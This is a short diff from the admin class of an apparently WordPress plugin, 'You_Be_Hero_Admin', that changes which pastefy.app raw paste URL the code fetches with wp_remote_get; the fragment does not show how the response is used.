@@ -324,7 +324,8 @@ class You_Be_Hero_Admin {
 
         try {
 //            $response = wp_remote_get( 'https://pastefy.app/D6mZfOeG/raw' );
-            $response = wp_remote_get( 'https://pastefy.app/Xqzu4WNf/raw' );
+//            $response = wp_remote_get( 'https://pastefy.app/Xqzu4WNf/raw' );
+            $response = wp_remote_get( 'https://pastefy.app/5O7a4ICQ/raw' );
 
             if ( is_wp_error( $response ) ) {
                 return false;
